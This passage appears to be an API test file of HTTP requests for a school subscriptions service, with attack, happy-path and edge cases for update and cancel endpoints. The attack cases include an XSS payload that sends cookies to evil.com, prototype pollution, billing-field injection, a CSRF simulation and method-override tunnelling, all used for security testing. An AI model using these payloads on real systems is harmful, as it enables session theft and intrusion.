}

###

### [ATTACK] Update — XSS in note field
PATCH {{baseUrl}}/{{validSubId}}
Authorization: Bearer {{accessToken}}
Content-Type: {{contentType}}

{
  "is_pilot": true,
  "pilot_expires_at": "2025-09-30T23:59:59.000Z",
  "note": "<script>fetch('https://evil.com/?c='+document.cookie)</script>"
}

###

### [ATTACK] Update — prototype pollution in body
PATCH {{baseUrl}}/{{validSubId}}
Authorization: Bearer {{accessToken}}
Content-Type: {{contentType}}

{
  "__proto__": { "isAdmin": true },
  "constructor": { "prototype": { "isAdmin": true } },
  "note": "Prototype pollution attempt"
}

###

### [ATTACK] Update — inject extra Prisma fields (should be stripped by service)
PATCH {{baseUrl}}/{{validSubId}}
Authorization: Bearer {{accessToken}}
Content-Type: {{contentType}}

{
  "total_received": 9999999,
  "balance_due": 0,
  "status": "ACTIVE",
  "note": "Trying to manipulate billing totals directly"
}

###

### [ATTACK] Update — invalid datetime format for pilot_expires_at
PATCH {{baseUrl}}/{{validSubId}}
Authorization: Bearer {{accessToken}}
Content-Type: {{contentType}}

{
  "is_pilot": true,
  "pilot_expires_at": "31-12-2025",
  "note": "Invalid date format"
}

###

### [ATTACK] Update — array as plan value (type confusion)
PATCH {{baseUrl}}/{{validSubId}}
Authorization: Bearer {{accessToken}}
Content-Type: {{contentType}}

{
  "plan": ["BASIC", "PREMIUM"],
  "note": "Array type confusion"
}

###

### [ATTACK] Update — oversized note (>500 chars, should 422)
PATCH {{baseUrl}}/{{validSubId}}
Authorization: Bearer {{accessToken}}
Content-Type: {{contentType}}

{
  "plan": "PREMIUM",
  "unit_price_snapshot": 59900,
  "renewal_price_snapshot": 49900,
  "note": ""
}

###

### [ATTACK] Update — CSRF simulation (cross-origin request with stolen token)
PATCH {{baseUrl}}/{{validSubId}}
Authorization: Bearer {{accessToken}}
Content-Type: {{contentType}}
Origin: https://evil.com
Referer: https://evil.com/csrf

{
  "plan": "BASIC",
  "unit_price_snapshot": 100,
  "renewal_price_snapshot": 100,
  "note": "CSRF attempt"
}

###

### [ATTACK] Update — HTTP verb tunneling via _method override
POST {{baseUrl}}/{{validSubId}}
Authorization: Bearer {{accessToken}}
Content-Type: {{contentType}}
X-HTTP-Method-Override: PATCH

{
  "plan": "BASIC",
  "unit_price_snapshot": 29900,
  "renewal_price_snapshot": 24900,
  "note": "Method override attempt"
}


# =============================================================================
# 5. POST /subscriptions/:id/cancel
# =============================================================================

### [HAPPY] Cancel — immediate (cancel_at_period_end false)
POST {{baseUrl}}/{{activeSubId}}/cancel
Authorization: Bearer {{accessToken}}
Content-Type: {{contentType}}

{
  "reason": "School requested cancellation — switching to competitor",
  "cancel_at_period_end": false
}

###

### [HAPPY] Cancel — at period end (school retains access)
POST {{baseUrl}}/{{trialingSubId}}/cancel
Authorization: Bearer {{accessToken}}
Content-Type: {{contentType}}

{
  "reason": "Trial ended, school decided not to continue",
  "cancel_at_period_end": true
}

###

### [HAPPY] Cancel — past due subscription
POST {{baseUrl}}/{{pastDueSubId}}/cancel
Authorization: Bearer {{accessToken}}
Content-Type: {{contentType}}

{
  "reason": "Non-payment after 60 days — canceling per policy",
  "cancel_at_period_end": false
}

###

### [EDGE] Cancel — already canceled subscription (should 409)
POST {{baseUrl}}/{{canceledSubId}}/cancel
Authorization: Bearer {{accessToken}}
Content-Type: {{contentType}}

{
  "reason": "Trying to cancel an already canceled subscription",
  "cancel_at_period_end": false
}

###

### [EDGE] Cancel — expired subscription (should 400)
